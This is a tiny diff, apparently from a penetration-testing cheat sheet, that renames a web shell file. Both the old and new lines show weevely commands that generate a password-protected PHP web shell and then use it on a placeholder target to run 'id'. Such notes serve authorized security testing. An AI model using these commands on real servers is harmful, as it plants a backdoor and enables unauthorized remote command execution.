@@ -1,2 +1,2 @@
-weevely generate $PASSWORD ./webshell-exegol.php
-weevely https://$TARGET/webshell-exegol.php $PASSWORD id
+weevely generate $PASSWORD ./webshell-mandalore.php
+weevely https://$TARGET/webshell-mandalore.php $PASSWORD id
